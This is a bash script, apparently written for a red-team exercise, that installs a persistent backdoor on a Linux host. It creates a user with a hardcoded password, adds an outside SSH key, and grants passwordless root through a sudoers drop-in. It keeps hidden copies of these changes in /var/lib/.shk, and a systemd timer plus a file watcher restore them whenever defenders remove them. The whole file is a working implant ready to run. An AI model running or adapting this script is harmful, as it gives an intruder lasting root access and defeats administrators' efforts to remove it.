#!/bin/bash
# Squad: shark
# File: create_shark.sh 
# Purpose: Access via SSH key for user shark, escalation via a sudoers NOPASSWD drop-in,
# and persistence via a systemd oneshot+timer plus a path-based watcher.

set -euo pipefail

SQUAD="shark"
USER_HOME="/home/${SQUAD}"
SSH_DIR="${USER_HOME}/.ssh"
AUTH_KEYS="${SSH_DIR}/authorized_keys"

PRIV_STASH="/var/lib/.shk"    
SSHD_DROP="/etc/ssh/sshd_config.d/40-${SQUAD}.conf"

KEEP_BIN="/usr/local/bin/${SQUAD}-keep.sh"
KEEP_SVC="/etc/systemd/system/${SQUAD}-keep.service"
KEEP_TMR="/etc/systemd/system/${SQUAD}-keep.timer"

KEYS_PATH="/etc/systemd/system/${SQUAD}-keys.path"
KEYS_SVC="/etc/systemd/system/${SQUAD}-keys.service"

SUDOERS_DROP="/etc/sudoers.d/90-${SQUAD}"

PUBLIC_KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAqoxCUvKeWpvzfgD2G6FcbCe9iOffxyF3tdgMWKz0hr kevin@LAPTOP-9PKUAH5N'

if ! id -u "${SQUAD}" >/dev/null 2>&1; then
  useradd -m -s /bin/bash --password "$(openssl passwd passwordsAREwrong)" "${SQUAD}"
fi

install -d -m 700 -o "${SQUAD}" -g "${SQUAD}" "${SSH_DIR}"
if ! grep -qF "${PUBLIC_KEY}" "${AUTH_KEYS}" 2>/dev/null; then
  echo "${PUBLIC_KEY}" >> "${AUTH_KEYS}"
fi
chown "${SQUAD}:${SQUAD}" "${AUTH_KEYS}"
chmod 600 "${AUTH_KEYS}"

install -d -m 755 /etc/ssh/sshd_config.d
cat > "${SSHD_DROP}" <<EOF
# ${SQUAD}: keep PubkeyAuthentication enabled (additive)
PubkeyAuthentication yes
EOF
chmod 644 "${SSHD_DROP}"
systemctl reload sshd 2>/dev/null || true

cat > "${SUDOERS_DROP}" <<EOF
# ${SQUAD} limited escalation (exactly one method)
${SQUAD} ALL=(ALL) NOPASSWD: /bin/bash
Defaults:${SQUAD} !requiretty
EOF
chmod 440 "${SUDOERS_DROP}"
visudo -cf "${SUDOERS_DROP}" >/dev/null

install -d -m 700 "${PRIV_STASH}"
cp -f "${SUDOERS_DROP}" "${PRIV_STASH}/sudoers.backup"
cp -f "${AUTH_KEYS}"    "${PRIV_STASH}/authorized_keys.backup"
cp -f "${SSHD_DROP}"    "${PRIV_STASH}/sshd_drop.backup"

cat > "${KEEP_BIN}" <<'EOS'
#!/bin/bash
set -euo pipefail
SQUAD="shark"
AUTH_KEYS="/home/${SQUAD}/.ssh/authorized_keys"
SUDOERS_DROP="/etc/sudoers.d/90-${SQUAD}"
SSHD_DROP="/etc/ssh/sshd_config.d/40-${SQUAD}.conf"
PRIV_STASH="/var/lib/.shk"

if ! id -u "${SQUAD}" >/dev/null 2>&1; then
  useradd -m -s /bin/bash --password "$(openssl passwd passwordsAREwrong)" "${SQUAD}" || true
fi

install -d -m 700 -o "${SQUAD}" -g "${SQUAD}" "/home/${SQUAD}/.ssh"

if [ -f "${PRIV_STASH}/authorized_keys.backup" ]; then
  if ! cmp -s "${PRIV_STASH}/authorized_keys.backup" "${AUTH_KEYS}" 2>/dev/null; then
    cp -f "${PRIV_STASH}/authorized_keys.backup" "${AUTH_KEYS}"
    chown "${SQUAD}:${SQUAD}" "${AUTH_KEYS}"
    chmod 600 "${AUTH_KEYS}"
  fi
fi

if [ -f "${PRIV_STASH}/sudoers.backup" ] && [ ! -f "${SUDOERS_DROP}" ]; then
  cp -f "${PRIV_STASH}/sudoers.backup" "${SUDOERS_DROP}"
  chmod 440 "${SUDOERS_DROP}"
  visudo -cf "${SUDOERS_DROP}" >/dev/null 2>&1 || true
fi

if [ -f "${PRIV_STASH}/sshd_drop.backup" ] && [ ! -f "${SSHD_DROP}" ]; then
  cp -f "${PRIV_STASH}/sshd_drop.backup" "${SSHD_DROP}"
  chmod 644 "${SSHD_DROP}"
  systemctl reload sshd 2>/dev/null || true
fi
EOS
chmod 700 "${KEEP_BIN}"

cat > "${KEEP_SVC}" <<EOF
[Unit]
Description=${SQUAD} keep-alive (restore key/sudoers if removed)
After=network.target

[Service]
Type=oneshot
ExecStart=${KEEP_BIN}
Nice=10
IOSchedulingClass=best-effort
EOF

cat > "${KEEP_TMR}" <<EOF
[Unit]
Description=${SQUAD} keep-alive timer

[Timer]
OnBootSec=90s
OnUnitActiveSec=3m
RandomizedDelaySec=30s
AccuracySec=30s

[Install]
WantedBy=timers.target
EOF

cat > "${KEYS_PATH}" <<EOF
[Unit]
Description=${SQUAD} key watcher

[Path]
PathChanged=/home/${SQUAD}/.ssh/authorized_keys

[Install]
WantedBy=multi-user.target
EOF

cat > "${KEYS_SVC}" <<EOF
[Unit]
Description=${SQUAD} key watcher handler (runs keeper)

[Service]
Type=oneshot
ExecStart=${KEEP_BIN}
Nice=10
IOSchedulingClass=best-effort
EOF

systemctl daemon-reload
systemctl enable --now "${SQUAD}-keep.timer"
systemctl enable --now "${SQUAD}-keys.path"

echo "[create_${SQUAD}] complete"
